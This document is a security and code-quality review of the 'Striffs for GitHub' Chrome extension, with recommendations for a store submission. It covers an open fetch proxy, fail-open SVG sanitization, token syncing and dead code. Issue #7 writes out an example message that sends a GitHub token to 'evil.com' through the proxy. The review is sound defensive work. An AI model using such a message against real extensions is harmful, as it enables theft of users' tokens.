# Striffs for GitHub — Chrome Web Store Production Readiness Review

**Extension v1.0.3 · Review Date: 2026-04-19**

---

## Executive Summary

This review covers the complete Striffs for GitHub browser extension codebase: manifest.json, background.js (726 lines), striffs.js (7,316 lines), popup.js (344 lines), options.js (215 lines), webext-shim.js (105 lines), pr-metadata-utils.js (140 lines), and all HTML/config/library files.

The extension is well-architected overall. The MV3 service worker pattern is correct, the message router is well-structured, error handling is generally defensive, and the GitHub DOM integration is resilient with multiple fallback selectors. The issues identified below range from store-submission blockers to polish items.

| Category | Count | Summary |
|----------|-------|---------|
| Blockers | 1 | Test data in package |
| Security | 8 | SVG XSS, open proxy, token sync, innerHTML injection, test harness exposed |
| Dead & Unused Code | 1 (with 20+ specific items) | Unused handlers, unreachable functions, dead monkey-patch, orphaned exports |
| Code Quality | 8 | Duplication, version mismatch, dead code, debug logs, vendored libs |
| Architecture & Runtime | 7 | Polling, race condition, cache coherence, fetch inconsistency |
| Monolith Improvement Tips | 5 | Section markers, state encapsulation, CSS extraction, event emitter, JSDoc |
| User Experience & Ratings | 9 | Silent failures, first-run onboarding, progress feedback, error persistence, vote acknowledgment |
| Minor / Polish | 7 | Missing icon, no CSP, port rewrite hack, counter resets |

---

## Files Reviewed

| File | Description |
|------|-------------|
| `manifest.json` | Extension manifest (MV3) |
| `src/background.js` | Service worker — message router, API proxy, token management (726 lines) |
| `src/striffs.js` | Content script — core logic, UI, caching, engagement, AI review (7,316 lines) |
| `src/webext-shim.js` | Firefox/Safari compatibility shim (105 lines) |
| `src/pr-metadata-utils.js` | GitHub PR DOM metadata extraction (140 lines) |
| `html/popup.js` | Popup UI — token management, cache clearing (344 lines) |
| `html/options.js` | Options page — token management, cache clearing (215 lines) |
| `html/popup.html` | Popup HTML (164 lines) |
| `html/options.html` | Options page HTML (72 lines) |
| `html/config-local-test.json` | Test configuration file |
| `lib/fflate.min.js` | Vendored compression library |
| `lib/panzoom.min.js` | Vendored pan/zoom library |
| `package.json` | Node project metadata |

---

## Appendix: tabs/scripting Permission Investigation

A detailed investigation was conducted into whether the extension requires the `tabs` and `scripting` permissions. The manifest declares only the `storage` permission, yet the code references `chrome.tabs.query`, `chrome.tabs.sendMessage`, and `chrome.scripting.executeScript` in multiple files.

**Findings:**

- `chrome.tabs.query` with URL filters works without the `tabs` permission because the manifest's `host_permissions` already cover `*://github.com/*` and `*://*.github.com/*`. In MV3, `host_permissions` grant the ability to see tab URLs for matching domains.
- `chrome.tabs.sendMessage` requires no special permission beyond having a valid tab ID. Since the content script is injected via the manifest's `content_scripts` declaration, it can receive messages without additional permissions.
- `chrome.scripting.executeScript` requires the `scripting` permission, which is not declared. However, every usage of this API is either guarded by optional chaining (`chrome.scripting?.executeScript` in background.js) or wrapped in a try/catch block (popup.js). When the API is unavailable, the code silently falls back to the `sendMessage` path, which succeeds.

**Conclusion:** The extension works correctly without the `tabs` or `scripting` permissions. The `chrome.scripting.executeScript` calls are dead-in-practice fallback code that gracefully degrades. The recommendation is to either add the `scripting` permission to activate the fallback, or remove the dead `executeScript` code to reduce surface area. This is covered in the Dead & Unused Code section below.

---

## Blockers — Chrome Web Store Rejection Risk

These issues will likely cause rejection during Chrome Web Store review or result in broken functionality for end users.

### #1 — 36 MB of test/Playwright browser profile data in package

The `test/` directory contains full Chromium profile data including cookies, cache, IndexedDB, session storage, login data, and browsing history. This bloats the package from roughly 1 MB to 37 MB. Chrome Web Store enforces a package size limit and reviewers will flag database files like `Cookies`, `Login Data`, and `History` as suspicious. Shipping these files is also a potential privacy leak since the profile was generated from a real GitHub session.

**Recommendation:** Exclude the `test/` directory entirely from the submission zip. Add a build script or `.extensionignore` to automate this. Also exclude `config-local-test.json`, `.github/`, `package.json`, `package-lock.json`, and `README.md` from the submission zip.

---

## Security Issues

These issues represent real security risks that should be addressed before any public release.

### #3 — SVG sanitization fails open (XSS risk)

In `sanitizeSvg()` (striffs.js ~line 820), the catch block returns the original unsanitized SVG string: `return svgString`. If the DOMParser throws for any reason (malformed input, memory pressure), unsanitized SVG containing `<script>` tags or `on*` event handlers gets injected via `innerHTML`. This is a real XSS vector.

**Recommendation:** Change the catch block to return `''` (empty string) instead of `svgString`. Failing closed is the correct security posture.

### #4 — toast() uses innerHTML with dynamic content

Line 2118 injects the `message` parameter via innerHTML in a template literal. While all current callers pass hardcoded strings, this is a latent XSS vector. If any future caller passes API error text or user-controlled data, it becomes exploitable.

**Recommendation:** Switch to `textContent` for the message content, or create DOM nodes programmatically with `createElement`/`appendChild`. Apply this pattern consistently across all `innerHTML` assignments with dynamic data.

### #5 — proxyFetch is an unrestricted open proxy

The `proxyFetch` message handler in background.js will fetch any URL with any headers and return the response. There is no allowlist of permitted domains. Any content script or malicious code running on github.com can send a message to fetch arbitrary URLs through the extension's privileged background page, bypassing CORS. This is a significant privilege escalation risk and a pattern Chrome Web Store reviewers specifically look for.

**Recommendation:** Add URL validation to restrict fetches to an allowlist of permitted domains: `api.github.com`, your own API domain (the configured API base), and the CDN config URL (`striffs-config.tor1.cdn.digitaloceanspaces.com`). Reject any URL not matching the allowlist.

### #6 — GitHub token synced to Google servers via chrome.storage.sync

`saveTokenToBoth()` writes the token to both `chrome.storage.local` and `chrome.storage.sync`. Sync storage is backed by the user's Google account and transmitted to Google's cloud servers. GitHub tokens are secrets and should not leave the local machine.

**Recommendation:** Remove all `chrome.storage.sync` usage for the `ghToken` key. Store tokens exclusively in `chrome.storage.local`. Update both popup.js and options.js accordingly.

### #7 — Token exfiltration via proxyFetch

Because `proxyFetch` has no URL restrictions (issue #5), a crafted message from any script on a matched GitHub page could send the token to an arbitrary server: `{ type: 'proxyFetch', url: 'https://evil.com', headers: { 'X-Stolen': token } }`. This compounds the proxyFetch proxy issue.

**Recommendation:** This is resolved by fixing issue #5 (adding the URL allowlist to proxyFetch).

### #8 — Test harness accessible to page scripts in production

The `window.addEventListener('message', ...)` handler at line ~6445 exposes internal functions (`ensureSupportedExtensionsReady`, `debugSupportedLanguagesCache`, `runAiReviewManualChecks`) to any script on the page. The guard is `S.isTest()`, which checks `localStorage.getItem('striffsTest') === '1'`. Any script running on GitHub can set this localStorage key and invoke the test harness, reading internal extension state.

**Recommendation:** Either remove the test harness entirely for production builds, or gate it behind `chrome.storage` (which page scripts cannot access) instead of `localStorage`.

### #9 — Custom cssEscape is incomplete

Line 3664 defines `S.cssEscape = (id) => String(id).replace(/([\"\\\\\\]])/g, '\\\\$1')`. This only escapes three characters (`"`, `\`, `]`), missing many CSS-special characters (leading digits, colons, periods, null characters). Since escaped values go into `querySelector('[data-qualified-name="..."]')`, a crafted qualified name could break out of the selector.

**Recommendation:** Replace the custom function with the browser-native `CSS.escape()` which is available in all modern browsers and handles all edge cases correctly.

### #10 — Content script makes direct GitHub API calls

`fetchJsonWithTimeout` and `fetchTextWithTimeout` (lines ~5760-5810) make `fetch()` calls directly from the content script to `api.github.com`. Content scripts in MV3 do not inherit `host_permissions` for CORS bypass. These calls only work because GitHub's API currently sends `Access-Control-Allow-Origin: *`. If GitHub changes their CORS policy, these calls break silently.

**Recommendation:** Route all external API calls through the background script's `proxyFetch` handler (after fixing its URL validation) for consistency and reliability.

---

## Dead & Unused Code

The following dead and unused code was identified across the codebase. Removing it reduces attack surface, shrinks the submission package, and makes the codebase easier to reason about for both maintainers and Chrome Web Store reviewers.

### #11 — Dead and unused code audit

**background.js — Unused message handlers (never called from any content script, popup, or options page):**

| Handler | Line | Status |
|---------|------|--------|
| `downloadZip` | 545 | Never called. Also functions as an unrestricted fetch proxy — security risk. |
| `keepAlive` | 328 | Never called from any client code. |
| `getToken` | 331 | Never called. Content script reads tokens directly via `chrome.storage.local`. `forgetToken` IS used. |
| `getSupportedLanguagesCache` | 430 | Never called from any client code. |

**background.js — Dead `chrome.scripting.executeScript` fallbacks:**

All `chrome.scripting.executeScript` calls in background.js (`clearGithubLocalStorages`, lines ~215-250) are guarded by `if (!chrome.scripting?.executeScript) return false` and never execute because the `scripting` permission is not declared. The `tryMessage()` path handles all cache clearing successfully.

**popup.js — Dead `chrome.scripting.executeScript` fallback:**

The `tryScript()` function in `clearGithubTabsCaches()` (lines 151-190) calls `chrome.scripting.executeScript` wrapped in a try/catch. It always fails silently because the `scripting` permission is undeclared. The `tryMessage()` path succeeds first due to short-circuit evaluation.

**striffs.js — `history.pushState`/`replaceState` monkey-patching (lines 7265-7269):**

Content scripts run in an isolated JavaScript world. The content script's `history.pushState` is a separate reference from the page's. When GitHub calls `history.pushState` during SPA navigation, the patched version is never invoked. Navigation detection actually relies on the `setInterval(..., 800)` polling fallback at line 7275, making the monkey-patch dead code.

**striffs.js — Unused function exports on `window.Striffs`:**

| Export | Line | Notes |
|--------|------|-------|
| `S.showToast` | 5306 | Defined but never called (S.toast is used instead) |
| `S.resetCurrentView` | 1712 | Defined but never called |
| `S.clearApiBaseOverride` | 1135 | Defined but never called |
| `S.setApiBaseOverride` | 1123 | Defined but never called |
| `S.getSavedActiveTab` | 2930 | Defined but never called |
| `S.getEngagementCounters` | ~907 | Defined but never called |
| `S.isPRListPath` | — | Defined but never called |
| `S.prScopeKey` | — | Defined but never called |
| `S.isFileLikelySupportedForStriffs` | — | Defined but never called |
| `S.FOCUS_MAX_ZOOM` | 50 | Constant defined but never read |
| `S.MAX_UNAUTH_ZIP_SIZE_MB` | 8 | Constant defined but never read |

**striffs.js — Unused debug state properties:**

These are assigned but never read programmatically. They exist solely for manual console inspection but are not gated behind debug mode, so they run in production:

| Property | Notes |
|----------|-------|
| `S.__debugFilterFilesFromNav` | Written but never read |
| `S.__debugHeadBaseRefs` | Written but never read |
| `S.__debugParsedFileExplorerFilenames` | Written but never read |
| `S.__debugPrMetadata` | Written but never read |
| `S.__debugSvgText` | Written but never read |
| `S.__suppressCacheWritesUntil` | Written but never read |

**striffs.js — MutationObserver for test routing runs unconditionally:**

Lines 5286-5291 create a `MutationObserver` on `document.documentElement` watching for attribute changes to `data-striffs-test-route-request-id`. This observer runs on every GitHub page regardless of whether test mode is active, firing its callback on unrelated mutations.

**Files that should not be in the submission package:**

| File/Directory | Size | Reason |
|----------------|------|--------|
| `test/` | 36 MB | Playwright browser profiles with cookies, history, login data |
| `html/config-local-test.json` | <1 KB | Test-only configuration |
| `.github/workflows/` | 0 | Empty directory |
| `package.json` | <1 KB | Node metadata, not needed at runtime |
| `package-lock.json` | — | Not needed at runtime |
| `preview-menu.png` | — | Dev screenshot, not needed at runtime |

**Recommendation:** Remove all unused handlers from background.js (`downloadZip`, `keepAlive`, `getToken`, `getSupportedLanguagesCache`). Remove the `history.pushState`/`replaceState` monkey-patching. Remove or consolidate dead exports from striffs.js. Gate the test `MutationObserver` behind `S.isTest()`. Create a build/packaging script that excludes test files, dev config, and package metadata from the submission zip.

---

## Code Quality

These issues affect maintainability, reviewer confidence, and long-term reliability.

### #12 — Massive code duplication between popup.js and options.js

Both files contain near-identical implementations of `validateToken`, `proxyJson`, `parseClassicScopes`, `saveTokenToBoth`, `clearTokenEverywhere`, `clearExtensionCaches`, `tokenExists`, and badge management. This is roughly 100 lines duplicated.

**Recommendation:** Extract shared functions into a common module (e.g. `html/shared.js`) and load it from both `popup.html` and `options.html` via a `<script>` tag.

### #13 — Version mismatch between manifest.json and package.json

`manifest.json` declares version `1.0.3` while `package.json` declares version `1.0.2`. These should always be in sync.

**Recommendation:** Align versions. Ideally add a build/CI step that enforces they match, or derive the manifest version from package.json.

### #14 — README.md is outdated

The file structure section references `content-script.js`, `background.js` at root level, `panzoom.min.js` at root level, and `options.html` at root level. None of these match the actual `src/`, `html/`, `lib/` directory layout.

**Recommendation:** Update the README to accurately reflect the current directory structure and file locations.

### #15 — Un-gated console.log statements in production code

Lines 3817, 3833, 3838, 3852, 3934-3946, 3954, 4704, and 4777 in striffs.js call `console.log` directly rather than through the debug-gated `S.clog()`. These will log verbose internal data structures to every user's console in production.

**Recommendation:** Replace all direct `console.log` calls with `S.clog()` or wrap them in `if (S.isDebug())` guards.

### #16 — Vendored libraries without version metadata

`lib/fflate.min.js` and `lib/panzoom.min.js` are vendored minified files with no version comments or metadata. If a security vulnerability is discovered in either library, there is no way to determine which version is shipped.

**Recommendation:** Add version comments at the top of each file (e.g. `/* fflate v0.8.2 */`), or create a `lib/VERSIONS.md` documenting the exact versions.

### #17 — config-local-test.json shipped in production package

`html/config-local-test.json` is test infrastructure that should not be included in the Chrome Web Store submission.

**Recommendation:** Exclude this file from the submission zip.

### #18 — Inconsistent fetch architecture: three different patterns

The codebase uses three fetch approaches: (a) background script `proxyFetch` message handler, (b) direct `fetch()` in the content script via `fetchJsonWithTimeout`, (c) background script dedicated handlers like `fetchStriffsWithToken`. This makes it hard to reason about where network requests originate, what CORS rules apply, and where tokens flow.

**Recommendation:** Consolidate to a single pattern. The recommended approach is to route all network requests through the background script, since it has full CORS bypass via `host_permissions`.

### #19 — downloadZip handler is unused but still exposed

The `downloadZip` message handler in background.js fetches any URL and returns the full response as a byte array. It is not called anywhere in the content script or popup/options code. It is dead code that also functions as an unrestricted fetch proxy.

**Recommendation:** Remove the `downloadZip` handler entirely. (Also covered in Dead Code section.)

---

## Architecture & Runtime

These issues affect performance, correctness, and runtime behavior.

### #20 — 800ms polling interval runs on every GitHub tab

The `setInterval` at line 7275 polls `location.pathname` every 800ms to detect SPA navigation. This creates 1.25 wakeups per second on every GitHub tab, even when the user is not on a PR page and will never visit one in that tab.

**Recommendation:** Replace with a `MutationObserver` on `document.title` or `<link rel='canonical'>` which fires only when the URL actually changes. This is event-driven and zero-cost when idle.

### #21 — Race condition in bootIfNeeded

`bootIfNeeded()` is called from multiple event listeners (turbo events, popstate, polling interval, striffs:navigate) without any mutex or debounce. If two events fire in quick succession during GitHub page transitions, both calls could pass the `lastPath` guard before either updates it, resulting in duplicate initialization.

**Recommendation:** Add a simple in-progress flag (e.g. `let booting = false;` at the top of `bootIfNeeded`, return if true, set to true at entry and false at exit) or use a debounce wrapper.

### #22 — localStorage cache has no quota handling

`writeCacheToLocalStorage` (line ~5467) silently catches and ignores quota errors. Large SVG diagrams for big repos could fill the ~5 MB localStorage quota, causing all subsequent caching to silently fail without any user feedback.

**Recommendation:** Detect `QuotaExceededError` specifically and either: (a) surface a debug-level warning, (b) evict the oldest cached entry and retry, or (c) fall back to IndexedDB which has much higher limits.

### #23 — Dual caching layer (localStorage + IndexedDB) with no coherence

The extension writes caches to both localStorage and IndexedDB. `readCacheFromLocalStorage` and `readCacheFromIndexedDb` are called independently, but there is no coherence protocol. If one succeeds and the other has stale data, you could get inconsistent state.

**Recommendation:** Pick one primary storage mechanism (IndexedDB is the better choice for large data) and use the other only as a fallback. Or implement a version/timestamp check so the most recent write always wins.

### #24 — Orphaned temp storage keys can accumulate

`storeTempResponsePayload` (background.js) and `storeTempChangedFiles` (striffs.js) create timestamped keys in `chrome.storage.local`. These are cleaned on the happy path, but if the content script crashes or the tab is closed before reading, they accumulate indefinitely.

**Recommendation:** Add a periodic cleanup in the background script. On each `onMessage` event (or on service worker startup), scan for keys matching `striffsTempResponse:` and `striffsTempChangedFiles:` that are older than 5 minutes and remove them.

### #25 — clearChromeStorageCaches filter is overly broad

The filter `lower.startsWith('striffs')` will match any key starting with "striffs", which could accidentally clear keys from future features or unrelated extensions that happen to use similar prefixes.

**Recommendation:** Rely on the explicit prefix list rather than the broad startsWith check.

### #26 — Port 8092 to 8080 auto-rewrite in normalizeApiBase

`normalizeApiBase` silently rewrites port 8092 to 8080. This appears to be a development-only hack and will confuse users who deliberately configure port 8092.

**Recommendation:** Remove this rewrite or document why it exists.

---

## Monolith Improvement Suggestions

`striffs.js` is a 7,316-line monolith. Rather than splitting it into separate files (which would require a build system), the following improvements can make it significantly more maintainable while keeping it as a single file.

### M1 — Add clear section markers and a table of contents comment

The file is already structured as concatenated logical sections (`striffs-core.js`, `striffs-state.js`, `striffs-dom-ui.js`, etc.) but navigation is difficult. Add a structured comment block at the top listing all sections with line numbers, and add prominent visual dividers between sections.

**Example:**
```
// === STRIFFS.JS TABLE OF CONTENTS ===
// Line    4: striffs-core.js — Constants, state, logging, messaging, storage
// Line 1490: striffs-state.js — Shared render flags
// Line 1510: striffs-dom-ui.js — DOM helpers, toolbar, button management
// ... etc
```

### M2 — Encapsulate mutable state into a State object

There are dozens of `S.__` prefixed mutable flags (`S.__striffsReady`, `S.__aiReviewStatus`, `S.__waitingForToken`, etc.) scattered throughout the file with no centralized view of what the current state is. Group these into a single `S._state` object with getter/setter methods that validate transitions, making state changes auditable.

**Example:**
```javascript
S._state = {
  ready: false,
  aiReviewStatus: null,
  waitingForToken: false,
  // ... all other flags
};
S.setState = (key, value) => {
  S.clog?.('state', key, S._state[key], '->', value);
  S._state[key] = value;
};
```

### M3 — Extract inline CSS into a dedicated style block

CSS is scattered across the file in template literals (`getStriffsContainerMarkup`, toast styles, button styles, etc.). Consolidate all CSS into a single `addStyles()` function near the top of the file. This makes theming and debugging much easier.

**Example:** Create a single `S.injectStyles()` function that builds and injects one `<style>` element with all Striffs CSS, called once during initialization.

### M4 — Use a simple event emitter for cross-section communication

Different sections of the monolith communicate by directly calling each other's functions via `S.someFunction?.()`. This creates tight coupling. A simple pub/sub pattern would decouple sections while keeping everything in one file.

**Example:**
```javascript
S.on = (event, fn) => { (S._listeners[event] ||= []).push(fn); };
S.emit = (event, ...args) => { (S._listeners[event] || []).forEach(fn => fn(...args)); };
// Usage: S.emit('diagram:ready', svgText); instead of S.updateStriffButton?.({...})
```

### M5 — Add JSDoc annotations for public API functions

Functions exposed on the `S` (`window.Striffs`) object serve as a public API between sections but have no documentation. Adding JSDoc comments with `@param` and `@returns` would make the monolith navigable and enable IDE autocompletion.

**Example:**
```javascript
/**
 * @param {string} filePath - Normalized file path
 * @returns {Promise<boolean>} Whether the file was found and focused in the diagram
 */
S.focusFileInStriffs = async function focusFileInStriffs(filePath) { ... }
```

---

## Minor / Polish

Low-priority items that improve polish and reviewer confidence.

### #27 — package.json main is index.js — file does not exist

**Recommendation:** Remove or correct the `main` field.

### #28 — Empty .github/workflows/ directory

**Recommendation:** Either add CI/CD workflows or remove the empty directory.

### #29 — No explicit content_security_policy in manifest

MV3 has a default CSP, but explicitly declaring one demonstrates security awareness to reviewers.

**Recommendation:** Add an explicit `content_security_policy` to the manifest.

### #30 — No 32px icon provided

The manifest provides 16, 48, and 128px icons but not 32px. Chrome scales 48px down, which can look blurry.

**Recommendation:** Add a 32px icon variant.

### #31 — Engagement counters never reset

`S.__engagementSentCount`, `S.__engagementAckCount`, `S.__engagementFailedCount`, and `S.__engagementSkippedCount` only increment, never reset. On long-lived tabs, these grow indefinitely and become meaningless.

**Recommendation:** Reset counters on PR navigation or add a timestamp so debug output shows rates, not ever-growing totals.

### #32 — preview-menu.png in root

A dev screenshot is included at root level. Not needed at runtime.

**Recommendation:** Exclude from submission zip.

### #33 — .gitignore does not cover all dev artifacts

The `.gitignore` covers `.vscode/` and test profiles, but not `node_modules/`, `*.log`, or other common dev artifacts.

**Recommendation:** Add standard entries for `node_modules/`, `*.log`, `.DS_Store`, etc.

---

## User Experience & Ratings Protection

The following items address the most common causes of low ratings on Chrome Web Store extensions. These are not code bugs — they are experience gaps that cause users to leave 1-star reviews saying "doesn't work" even when the extension is functioning correctly. These are high-ROI fixes that don't require changing the product itself.

### UX1 — Silent failures are the #1 cause of bad reviews

A user installs, goes to a PR, clicks "Striffs," and nothing happens. They don't know if it's loading, broken, missing a token, or if their repo's language isn't supported. They leave a 1-star review saying "doesn't work." The extension has several spots where this can happen: the API call fails and the button just sits there, or the repo uses an unsupported language and there's no explanation. Every dead-end the user can hit needs a clear, human-readable message explaining what happened and what to do next.

**Recommendation:** Audit every error path and catch block in striffs.js. For each one, ask: "if this fires, does the user see anything?" Anywhere the answer is no, add a toast or status message. Key spots to check: API timeout, API error responses, unsupported language, token auth failure on private repos, empty SVG response, and the toolbar-not-found timeout.

### UX2 — No first-run onboarding

Someone installs from the store, opens a PR, and has no idea what to do. The extension may require a GitHub token for private repos, but there's no onboarding flow. The popup shows a token field and a "Clear Cache" button — that's it. A simple first-run state that says "Here's how Striffs works" with a quick explanation and link to docs would cut confused 1-star reviews dramatically.

**Recommendation:** Detect whether the user has ever successfully generated a diagram (a simple boolean flag in `chrome.storage.local`). If not, show a first-run onboarding state in the popup explaining the basics. Once they've had a successful generation, switch to the normal view. This could be as simple as a few sentences and a link.

### UX3 — No progress indication on long operations

The `generateStriffs` flow downloads a full repo zip, posts it to the API, and waits for a response. This can take a long time on large repos. The button shows "Loading" and the phase text updates ("Downloading", "Enriching") are good, but users don't know if it's going to be 5 seconds or 2 minutes. Users will wait 60 seconds if they see progress. They'll give up and leave a bad review after 10 seconds of a spinner with no context.

**Recommendation:** Add rough time context to the loading phases. Even something as simple as "Downloading base code… (large repos may take a minute)" sets expectations. For the API post phase, if you can get progress data from the server, show it. If not, even a subtle animated bar that moves slowly gives the perception of progress.

### UX4 — Error toasts disappear too quickly

Toast messages disappear after 7.5 seconds (`timeoutMs: 7500`). For error messages that require user action (like "token required for private repos" or "unsupported language"), that's too fast. Users might miss it entirely, especially if they switched tabs while waiting.

**Recommendation:** Make actionable error toasts persist until dismissed (add a small × close button), or at minimum last 15-20 seconds. Informational toasts ("Diagram ready") can stay at 7.5 seconds. Distinguish between "FYI" toasts and "you need to do something" toasts.

### UX5 — No way to report problems from within the extension

When something goes wrong, the only outlet for a frustrated user is the Chrome Web Store review page. Adding a "Report Issue" or "Get Help" link in the popup gives them a path to your GitHub issues page or support channel instead.

**Recommendation:** Add a small "Report an issue" link at the bottom of popup.html pointing to `https://github.com/hadii-tech/striff-browser-extension/issues`. This is a one-liner change with outsized impact on ratings — it redirects frustration away from the store page.

### UX6 — Popup and options page are inconsistent

The options page and popup do the same things (token management, cache clearing) but look different and behave differently. The options page has an overwrite confirmation dialog when saving a token; the popup doesn't. The layouts, styling, and status messaging are slightly different. Users who discover both will be confused about which is the "real" one.

**Recommendation:** Either pick one as the primary interface and have the other redirect to it, or make them visually and behaviorally identical. The popup is what most users will interact with, so it should be the more polished of the two.

### UX7 — No graceful handling of GitHub DOM changes

GitHub changes their DOM regularly, and the extension depends on a long list of CSS selectors to find the toolbar, file tree, and diff containers. The multiple fallback selectors are smart, but when all of them break, the extension silently stops mounting. The user sees nothing and assumes the extension is broken.

**Recommendation:** When the toolbar cannot be found after the wait timeout, show a small non-intrusive banner or toast saying "Striffs couldn't detect the GitHub pull request toolbar. GitHub may have updated their layout — please check for an extension update." This turns a 1-star "broken" review into an understandable situation. Also consider logging the failure to your engagement API so you get early warning when GitHub ships a breaking DOM change.

### UX8 — Store listing needs a clear visual demo

The single most common complaint on extension store pages is "I don't understand what this does." A screenshot or short GIF showing the extension working on a real PR — clicking the Striffs tab and seeing the diagram appear — would do more for ratings than most code changes.

**Recommendation:** Prepare 2-3 store listing screenshots: (a) the Striffs tab visible on a GitHub PR, (b) the rendered diagram with pan/zoom, (c) the popup with token management. If possible, add a short GIF or video showing the full flow. The store listing is the first impression — make it count.

### UX9 — Thumbs up/down feedback gives no acknowledgment

When a user clicks the 👍 or 👎 button on an AI review note, the click handler (striffs.js line ~625) fires the engagement event and then immediately calls `shell.remove()`, which makes both buttons vanish instantly. There is no visual confirmation that the vote was received. From the user's perspective, the buttons just disappeared — they don't know if it worked, if it was a glitch, or if their feedback mattered. This is a missed opportunity to make users feel heard, and it creates a small moment of confusion on every interaction.

**Current code (line ~613-626):**
```javascript
btn.addEventListener("click", (event) => {
    event.preventDefault();
    event.stopPropagation();
    S.__reviewNoteVotes?.set?.(noteId, vote);
    S.emitEngagementEvent?.("ai_note_feedback", { ... });
    // Hide the feedback buttons after clicking
    shell.remove();
});
```

**Recommendation — replace the instant removal with a three-step acknowledgment:**

1. **Immediately highlight the chosen button and hide the other one.** This gives instant visual feedback that the click registered. Keep the selected button visible with a slightly larger scale or a brief color pulse so the user can see which one they picked.

2. **Show a short "Thanks" label** next to or in place of the button for ~1.5 seconds. Something like "Thanks!" or a ✓ checkmark. This confirms the action was processed and makes the user feel their input is valued.

3. **Fade out and remove after the delay.** Instead of `shell.remove()`, fade the element out with a CSS transition, then remove it from the DOM after the transition completes.

**Example implementation:**
```javascript
btn.addEventListener("click", (event) => {
    event.preventDefault();
    event.stopPropagation();
    S.__reviewNoteVotes?.set?.(noteId, vote);
    S.emitEngagementEvent?.("ai_note_feedback", { ... });

    // 1. Hide the other button, highlight this one
    const sibling = shell.querySelector(
        `.striffs-note-feedback-btn:not([data-vote="${vote}"])`
    );
    if (sibling) sibling.style.display = "none";

    // 2. Show a brief "thanks" confirmation
    const thanks = document.createElement("span");
    thanks.textContent = "Thanks!";
    thanks.style.cssText =
        "font-size: 0.85em; color: #1a7f37; font-weight: 500; margin-left: 4px;";
    shell.appendChild(thanks);

    // 3. Fade out and remove after a short delay
    setTimeout(() => {
        shell.style.transition = "opacity 0.3s ease";
        shell.style.opacity = "0";
        setTimeout(() => shell.remove(), 300);
    }, 1400);
});
```

This turns a confusing "buttons vanished" moment into a small positive interaction that reinforces the user's engagement. It's a ~15-line change with no architectural impact.

---

## Priority Action Plan

Recommended order of operations before submitting to the Chrome Web Store.

### Phase 1 — Must-fix before submission

Exclude `test/` directory, `config-local-test.json`, and dev files from submission zip (#1). Fix `sanitizeSvg` to fail closed (#3). Add URL allowlist to `proxyFetch` (#5). Remove token from `chrome.storage.sync` (#6). Remove unused `downloadZip` handler (#11/#19).

### Phase 2 — Should-fix before submission

Remove all dead code identified in #11 (unused handlers, dead monkey-patch, orphaned exports). Replace custom `cssEscape` with `CSS.escape()` (#9). Remove or disable test harness in production (#8). Fix un-gated `console.log` statements (#15). Extract shared code from popup.js/options.js (#12). Add "Report an issue" link to popup (UX5). Prepare store listing screenshots/GIF (UX8).

### Phase 3 — UX & ratings protection

Audit all error/catch paths for silent failures and add user-facing messages (UX1). Add first-run onboarding state to popup (UX2). Improve loading phase text with time context (UX3). Make actionable error toasts persist longer or until dismissed (UX4). Align popup and options page behavior (UX6). Add graceful fallback messaging when GitHub DOM changes break toolbar detection (UX7). Add vote acknowledgment to thumbs up/down feedback (UX9).

### Phase 4 — Fix after initial release

Route all fetches through background script (#10, #18). Replace polling with MutationObserver (#20). Add `bootIfNeeded` debounce (#21). Improve cache coherence (#22, #23). Add temp key cleanup (#24). Add version metadata to vendored libs (#16).

### Phase 5 — Ongoing improvement

Implement monolith improvements: section TOC, state encapsulation, CSS extraction, event emitter, JSDoc (M1-M5). Align package.json version (#13). Update README (#14). Add 32px icon (#30). Add explicit CSP (#29).
